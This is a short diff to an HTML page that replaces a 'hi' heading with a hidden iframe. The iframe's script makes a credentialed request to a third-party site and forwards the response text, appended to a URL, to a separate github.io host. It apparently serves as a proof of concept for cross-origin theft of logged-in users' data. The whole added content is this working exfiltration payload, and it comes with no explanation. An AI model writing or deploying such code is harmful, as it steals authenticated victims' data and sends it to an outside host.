@@ -1,8 +1,18 @@
 <html>
   <body>
-    <h1>hi</h1>
+    <iframe style="display:none;" sandbox="allow-scripts" srcdoc="
+      <script>
+        var xhr = new XMLHttpRequest();
+        var url = 'https://fieldsranch.uat.pga.legends.blcdemo.com/'
 
+        xhr.onreadystatechange = function() {
+          if(xhr.readyState == XMLHttpRequest.DONE) {
+            fetch('https://m4tch4t3a.github.io/test.html' + xhr.responseText)
+            }
+          }
+        xhr.open('GET', url, true);
+        xhr.withCredentials = true;
+        xhr.send(null);
+      </script>"></iframe>
   </body>
-
-
 </html>
